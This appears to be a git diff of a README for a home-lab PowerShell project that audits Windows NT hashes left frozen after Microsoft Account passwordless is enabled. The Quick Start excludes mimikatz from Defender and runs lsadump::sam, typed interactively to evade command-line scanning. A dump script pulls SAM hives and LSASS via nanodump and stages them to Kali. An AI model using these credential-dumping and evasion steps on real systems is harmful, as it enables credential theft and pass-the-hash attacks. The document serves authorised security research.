@@ -1,61 +1,56 @@
-# Security Research Tool Protection Suite
+# Passwordless Credential Audit
+
+> For use on systems you own or have explicit written authorization to test.
+
+This repository investigates the NT hash security implications of enabling Microsoft Account passwordless authentication without a factory reset.
+
+When passwordless authentication is enabled on a Microsoft Account **before** Windows setup, no password ever exists from the PC's perspective — Windows generates a random NT hash with no crackable plaintext behind it. This is the optimal security posture.
+
+When passwordless authentication is enabled **after** setup on a system that authenticated with a Microsoft Account password, the NT hash derived from that password is frozen in the SAM indefinitely. It does not become random when passwordless is enabled — that requires a factory reset. Microsoft does not warn users of this. The frozen hash remains valid for pass-the-hash attacks regardless of the passwordless setting, and cannot be rotated without disabling passwordless authentication.
+
+The tools in this repository dump and analyze the local credential state to verify which scenario a system is in, establishing whether the NT hash is a random value (secure) or a frozen derivative of a Microsoft Account password (exploitable).
+
+---
+
+## Quick Start
 
 ```powershell
 Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/verify-then-trust/main/Add-TrustedFileExclusion.ps1" -OutFile "Add-TrustedFileExclusion.ps1" -UseBasicParsing
-Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/verify-then-trust/main/dump-your-pc.ps1" -OutFile "dump-your-pc.ps1" -UseBasicParsing
+```
+
+```powershell
 .\Add-TrustedFileExclusion.ps1 -FilePath ".\mimikatz.exe" -URL "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
+```
+
+```powershell
+.\mimikatz.exe
+```
+
+> **Note:** The following commands must be entered interactively within the mimikatz console. Passing them as command-line arguments triggers Defender's CmdLine scanner and results in immediate remediation regardless of file exclusions.
+
+```
+privilege::debug
+```
+
+```
+log mimikatz.log
+```
+
+```
+token::elevate
+```
+
+```
+lsadump::sam
+```
+
+```powershell
+Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/verify-then-trust/main/dump-your-pc.ps1" -OutFile "dump-your-pc.ps1" -UseBasicParsing
+```
+
+```powershell
 .\dump-your-pc.ps1
 ```
-
----
-
-PowerShell scripts for managing Windows Defender exclusions, file integrity
-monitoring, and out-of-band alerting for known-signature security research tools.
-
-Built for a Windows 11 home lab running OSCP / CPTS study and penetration
-testing research. Designed to apply the principle of least privilege at the
-Defender exclusion layer and integrate file integrity monitoring into a
-notification pipeline via the WiFi Pineapple Pager.
-
----
-
-## Architecture
-
-```
-Add-TrustedFileExclusion.ps1
-    If file already has a Defender exclusion:
-        SHA256 displayed - prompt to keep or remove exclusion
-        Y: exclusion kept, registry updated
-        N: exclusion removed
-    Otherwise:
-        File-specific Defender exclusion added before download
-        SHA256 computed, file deleted, exclusion removed
-        Hash displayed with source cross-reference link - user verifies against official release
-        Y/N prompt - N exits cleanly, nothing left on disk
-        Y: re-adds exclusion, re-downloads, verifies hash matches approved value
-            Read-only flag set (TOCTOU mitigation)
-            Hash registered in trusted_hashes.json
-
-Watch-FileIntegrity.ps1 (persistent, runs at startup)
-    Polls trusted_hashes.json every 60 seconds
-    Computes SHA256 of each registered file
-        Hash changed  -> INTEGRITY VIOLATION (urgent)
-        File deleted  -> FILE DELETED (urgent)
-            Pager TCP alert via soar_listener.sh
-            ntfy push notification to phone
-
-Confirm-FileProtection.ps1
-    6-point spot-check of all protection components
-```
-
----
-
-## Prerequisites
-
-- **Windows 11, PowerShell 5.1+, elevated session** (`#Requires -RunAsAdministrator`)
-- **WiFi Pineapple Pager** with `soar_listener.sh` running (for Pager alerts)
-- **ntfy** self-hosted on Mac Mini via Tailscale (for phone push notifications)
-- **Tailscale** enrolled on both Aurora and Pager for stable IP addressing
 
 ---
 
@@ -63,298 +58,81 @@ Confirm-FileProtection.ps1
 
 ### `Add-TrustedFileExclusion.ps1`
 
-Downloads or locates a file, computes its hash for source verification,
-then applies a file-specific Defender exclusion and integrity monitoring.
+Downloads or locates a file, computes its hash for source verification, then applies a file-specific Defender exclusion and integrity monitoring. Supports direct URLs, GitHub blob URLs, and ZIP archives.
 
-**Parameters:**
 | Parameter | Required | Description |
 |---|---|---|
-| `-FilePath` | Yes | Full path to the file. Used as download destination if -URL provided. Accepts a directory for direct file URLs — filename derived from URL. ZIP URLs require a full file path including the target filename to extract. |
-| `-URL` | No | Download URL. GitHub blob/tree URLs converted to raw automatically. ZIP archives supported — script extracts the target filename from inside the archive. |
-| `-ExpectedHash` | No | Optional safety check. Verifies hash matches a previously known value before prompting. |
-| `-PagerIP` | No | Tailscale IP of the Pager - omit to skip notification |
-| `-PagerPort` | No | Pager netcat listener port (default: 9999) |
+| `-FilePath` | Yes | Full path to the file. Accepts a directory for direct file URLs — filename derived from URL. ZIP URLs require a full file path including the target filename to extract. |
+| `-URL` | No | Download URL. GitHub blob/tree URLs converted to raw automatically. ZIP archives supported. |
+| `-ExpectedHash` | No | Verifies hash matches a previously known value before prompting. |
+| `-PagerIP` | No | Tailscale IP of the Pager - omit to skip notification. |
+| `-PagerPort` | No | Pager netcat listener port (default: 9999). |
 
-**What it does:**
+**Source verification:** Search by hash, not URL. Security research tools will show detections — this is expected. What matters is hash consistency against the official repository or release page.
 
-If the file already has a Defender exclusion (previously trusted):
-1. Computes SHA256 and displays it
-2. Prompts: "File already has a Defender exclusion. Y to continue trusting, N to remove"
-   - **Y**: exclusion kept, registry and read-only updated
-   - **N**: exclusion removed
+**Note on directory exclusions:** This script adds a file-path exclusion, not a directory exclusion. A directory exclusion creates a trusted execution zone any file benefits from. A file-path exclusion trusts exactly one artifact.
 
-Otherwise (new file or URL download):
-1. If `-URL` provided: adds exclusions, downloads file
-   - **ZIP URL**: exclusions added for temp path, destination directory, and target file before download. ZIP extracted to temp, target filename located inside archive, copied to `-FilePath`, temp files cleaned up
-   - **Direct URL**: exclusion added for target path before download
-2. Computes SHA256 hash
-3. Deletes file and removes exclusion pending confirmation
-4. Displays hash with link to cross-reference against known values
-5. Prompts: "Does this hash match the official release? (Y/N)"
-   - **N**: exits cleanly - no file on disk, no exclusion
-   - **Y**: re-adds exclusion, re-downloads, verifies hash matches approved value, sets read-only, writes to hash registry, optionally notifies Pager
+---
 
-**Usage:**
-```powershell
-# Download from URL to specific path (GitHub blob or raw URLs accepted)
-.\Add-TrustedFileExclusion.ps1 -FilePath "F:\nanodump.x64.exe" -URL "https://github.com/fortra/nanodump/blob/main/dist/nanodump.x64.exe"
+### `dump-your-pc.ps1`
 
-# Download from ZIP - script finds the target filename inside the archive
-.\Add-TrustedFileExclusion.ps1 -FilePath "F:\mimikatz.exe" -URL "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
-
-# File already on disk
-.\Add-TrustedFileExclusion.ps1 -FilePath "F:\nanodump.x64.exe"
-.\Add-TrustedFileExclusion.ps1 -FilePath "F:\mimikatz.exe"
-
-# Download to directory - filename derived from URL
-.\Add-TrustedFileExclusion.ps1 -FilePath "F:\" -URL "https://github.com/fortra/nanodump/blob/main/dist/nanodump.x64.exe"
-
-# With Pager notification
-.\Add-TrustedFileExclusion.ps1 -FilePath "F:\nanodump.x64.exe" -URL "https://..." -PagerIP "100.x.x.x"
-
-# Re-download with safety check against previously known hash
-.\Add-TrustedFileExclusion.ps1 -FilePath "F:\nanodump.x64.exe" -URL "https://..." -ExpectedHash "AD9E4D..."
-```
-
-**Source verification:**
-
-Search by hash, not URL — URL analysis caches results and may reflect a file
-from months or years ago. Security research tools will show detections; this is
-expected and not disqualifying. What matters is hash consistency: does this hash
-match the known value from the official repository or release page? If it does,
-the binary is authentic. Answer Y only after confirming against the official source.
-
-Raw GitHub URL format (blob URL to raw URL):
-```
-github.com/{user}/{repo}/blob/{branch}/{path}
-                 to
-raw.githubusercontent.com/{user}/{repo}/{branch}/{path}
-```
-
-GitHub blob URLs are converted automatically — you can paste either format.
-
-**Note on directory exclusions:**
-This script adds a file-path exclusion, not a directory exclusion. A directory
-exclusion creates a trusted execution zone any file benefits from - including
-files an attacker places there. A file-path exclusion trusts exactly one artifact.
+Dumps registry hives via `reg.exe` and LSASS via nanodump, enables SSH, and prints the exact `scp` commands to stage files to Kali. Prompts for the output drive at runtime — no hardcoded paths. All output logged to `<drive>\dump_log_<timestamp>.txt`.
 
 ---
 
 ### `Watch-FileIntegrity.ps1`
 
-Polls registered file paths every 60 seconds and fires Pager and ntfy alerts
-when a file's SHA256 no longer matches its registered value.
+Polls registered file paths every 60 seconds and fires Pager and ntfy alerts when a file's SHA256 no longer matches its registered value. Hash-based rather than event-based — file replacement destroys SACLs before Event 4663 fires.
 
-Detection is hash-based, not event-based. File replacement removes any SACL on
-the original object, making Event 4663 detection unreliable. Hash polling detects
-changes regardless of how the file was modified or replaced.
-
-**Parameters:**
 | Parameter | Required | Description |
 |---|---|---|
-| `-PagerIP` | Yes | Tailscale IP of the Pager |
-| `-PagerPort` | No | Pager netcat listener port (default: 9999) |
-| `-NtfyURL` | Yes | URL of the self-hosted ntfy instance |
-| `-RegistryPath` | No | Path to trusted_hashes.json (default: ProgramData\SecurityBaseline) |
-| `-IntervalSeconds` | No | Poll interval in seconds (default: 60) |
-
-**Usage:**
-```powershell
-.\Watch-FileIntegrity.ps1 `
-    -PagerIP "100.x.x.x" `
-    -NtfyURL "http://100.x.x.x:80/security-alerts"
-```
-
-**Run at startup (recommended):**
-```powershell
-$action  = New-ScheduledTaskAction -Execute "powershell.exe" `
-    -Argument "-NonInteractive -WindowStyle Hidden -File C:\Scripts\Watch-FileIntegrity.ps1 -PagerIP 100.x.x.x -NtfyURL http://100.x.x.x:80/security-alerts"
-$trigger = New-ScheduledTaskTrigger -AtStartup
-Register-ScheduledTask -TaskName "FileIntegrityWatcher" `
-    -Action $action -Trigger $trigger -RunLevel Highest -User "SYSTEM"
-```
-
-**Alert format:**
-```
-INTEGRITY VIOLATION
-File:     nanodump.x64.exe
-Path:     F:\nanodump.x64.exe
-Expected: AD9E4D...
-Actual:   B7F2A1...
-Time:     2026-06-07 14:32:15
-```
+| `-PagerIP` | Yes | Tailscale IP of the Pager. |
+| `-NtfyURL` | Yes | URL of the self-hosted ntfy instance. |
+| `-PagerPort` | No | Pager netcat listener port (default: 9999). |
+| `-IntervalSeconds` | No | Poll interval in seconds (default: 60). |
 
 ---
 
 ### `Confirm-FileProtection.ps1`
 
-Six-point verification of all protection components on a registered file.
-Run after `Add-TrustedFileExclusion.ps1` to confirm everything is in place.
+Seven-point spot-check of all protection components on a registered file.
 
-**Usage:**
 ```powershell
 .\Confirm-FileProtection.ps1 -FilePath "F:\nanodump.x64.exe"
 ```
 
-**Checks:**
-1. File exists on disk
-2. Drive is NTFS
-3. Read-only flag is set
-4. Defender exclusion is present for this exact path
-5. DACL restricts Users group to Read — no Write path for standard users
-6. Hash registry entry exists
-7. Current hash matches registry value
-
 ---
 
-### `soar_listener.sh` (Pager side)
+### `soar_listener.sh`
 
-Runs on the WiFi Pineapple Pager. Listens on TCP port 9999 for messages from
-the Aurora notification pipeline and triggers DuckyScript ALERT + VIBRATE.
-
-**Installation:**
-```sh
-scp soar_listener.sh root@<pager-ip>:/root/scripts/
-ssh root@<pager-ip> "chmod +x /root/scripts/soar_listener.sh"
-```
-
-Add to `/etc/rc.local` to run at boot:
-```sh
-/root/scripts/soar_listener.sh &
-```
-
-**Message routing:**
-- `EXCLUSION_ADDED:` prefix uses the dedicated exclusion alert payload
-- All other messages use the generic alert handler
+Runs on the WiFi Pineapple Pager. Listens on TCP port 9999 and triggers DuckyScript ALERT + VIBRATE on incoming messages.
 
 ---
 
 ## LSASS Dump Test Scripts
 
-Three batch files for testing credential access detection against a live LSASS process.
-These illustrate the distinction between signature detection and behavioral detection.
-
-### `lsass_nanodump.bat`
-
-**Works** when `Add-TrustedFileExclusion.ps1` has been run against the nanodump binary.
-nanodump carries a known malicious signature — Defender quarantines it on sight without
-the exclusion. With the file-specific exclusion in place, signature detection is bypassed
-and nanodump executes cleanly because its technique does not trigger behavioral detection.
-The exclusion is the only thing standing between nanodump and a successful LSASS dump.
-
-```cmd
-# Default output - saves to script directory
-.\lsass_nanodump.bat
-
-# Custom output path
-.\lsass_nanodump.bat "F:\dumps\"
-.\lsass_nanodump.bat "F:\dumps\lsass.dmp"
-```
-
-### `lsass_procdump.bat`
-
-**Does not work** regardless of any file exclusion. Procdump is a legitimate Sysinternals
-tool — it has no malicious signature and Defender will never quarantine it. The block comes
-from behavioral detection, which fires the moment procdump opens a handle to the LSASS PID.
-A file-specific exclusion has no effect on behavioral detection — the two systems are
-independent. The exclusion prevents quarantine; behavioral detection operates at runtime
-and cannot be bypassed by an exclusion.
-
-```cmd
-# Default output - procdump names the file automatically
-.\lsass_procdump.bat
-
-# Custom output path
-.\lsass_procdump.bat "F:\dumps\"
-.\lsass_procdump.bat "F:\dumps\lsass.dmp"
-```
-
-### `lsass_comsvcs.bat`
-
-**Does not work** for the same reason as procdump. Uses `rundll32.exe` to call `MiniDump`
-via `comsvcs.dll` — a Windows system file. There is no standalone executable to quarantine,
-so signature detection never fires. The block is behavioral: Defender detects the MiniDump
-call targeting the LSASS PID and denies it at the handle acquisition stage, identical to
-the procdump block.
-
-```cmd
-.\lsass_comsvcs.bat
-.\lsass_comsvcs.bat "F:\dumps\"
-.\lsass_comsvcs.bat "F:\dumps\lsass.dmp"
-```
-
-### Summary
+Three batch files illustrating the distinction between signature detection and behavioral detection.
 
 | Script | Signature blocked | Behavioral blocked | Works with exclusion |
 |---|---|---|---|
-| nanodump | Yes — quarantined without exclusion | No | Yes |
-| procdump | No — legitimate tool | Yes — LSASS PID access denied | No |
-| comsvcs | No — Windows system file | Yes — MiniDump on LSASS denied | No |
+| `lsass_nanodump.bat` | Yes — quarantined without exclusion | No | Yes |
+| `lsass_procdump.bat` | No — legitimate Sysinternals tool | Yes — LSASS handle denied | No |
+| `lsass_comsvcs.bat` | No — Windows system file | Yes — MiniDump on LSASS denied | No |
 
----
-
-## End-to-End Test
-
-```powershell
-# 1. Confirm baseline state
-.\Confirm-FileProtection.ps1 -FilePath "F:\nanodump.x64.exe"
-
-# 2. Start the watcher in a separate terminal
-.\Watch-FileIntegrity.ps1 -PagerIP "100.x.x.x" -NtfyURL "http://100.x.x.x:80/security-alerts"
-
-# 3. Trigger an integrity violation
-Set-ItemProperty "F:\nanodump.x64.exe" -Name IsReadOnly -Value $false
-copy C:\Windows\System32\cmd.exe "F:\nanodump.x64.exe"
-
-# Within 60 seconds the Pager should buzz and phone receive:
-# INTEGRITY VIOLATION - hash changed
-
-# 4. Restore by re-running Add-TrustedFileExclusion.ps1
-```
+Procdump and nanodump are inverses of each other on the detection axes. All three accept an optional output path argument — defaults to the script directory if omitted.
 
 ---
 
 ## Security Design Notes
 
-**Least privilege at the exclusion layer**
-Defender path exclusions are scoped to a single file, not a directory. An attacker
-with an admin shell who knows the exclusion exists cannot use it as a trusted
-execution zone for other tools.
+**Least privilege at the exclusion layer** — Exclusions are scoped to a single file path, not a directory. An attacker cannot use the exclusion as a trusted execution zone for other tools.
 
-**Delete before trust**
-The file does not exist on disk while waiting for user confirmation. If the user
-answers N, nothing is left behind. If Y, the file is re-downloaded and verified
-against the hash that was confirmed to match the official release, closing the gap
-between verification and final trust.
+**Delete before trust** — The file does not exist on disk while the user verifies the hash. Re-downloaded and re-verified on Y before trust is applied.
 
-**NTFS DACL write restriction**
-After trust, the DACL is modified to grant Administrators full control and restrict the Users group to Read only. This removes the write path for standard users, breaking the first element of a binary overwrite privilege escalation chain. A writable privileged binary requires both a writable file and a privileged execution context — removing write access for non-admins eliminates the attack regardless of whether the attacker later escalates privileges.
+**NTFS DACL write restriction** — Administrators full control, Users read-only. Removes the write path for standard users.
 
-**TOCTOU mitigation**
-Files are set read-only immediately after the final verified download. Replacing
-the file requires clearing the read-only attribute first - an additional privileged
-step.
+**TOCTOU mitigation** — Files set read-only immediately after the final verified download.
 
-**Hash polling over event detection**
-File integrity is monitored by polling SHA256 every 60 seconds rather than relying
-on SACLs and Event 4663. File replacement removes any SACL on the original object,
-making event-driven detection unreliable. Hash polling detects changes regardless
-of how the file was modified.
+**Hash polling over event detection** — SHA256 polled every 60 seconds. File replacement destroys SACLs, making Event 4663 unreliable.
 
-**Out-of-band notification**
-Alerts route through the Pager and phone via TCP to the Pager's netcat listener,
-operating independently of the Aurora's security state. An attacker who disables
-Sysmon or Defender on the Aurora cannot suppress these notifications.
-
----
-
-## File Layout
-
-```
-C:\ProgramData\SecurityBaseline\
-    trusted_hashes.json          Hash registry for Watch-FileIntegrity.ps1
-
-/root/scripts/soar_listener.sh   Pager - TCP listener and alert trigger
-/root/payloads/alerts/exclusion/
-    payload.ds                   DuckyScript for exclusion-added alerts
-```
+**Out-of-band notification** — Alerts route through the Pager and phone via TCP, independent of the Aurora's security state.
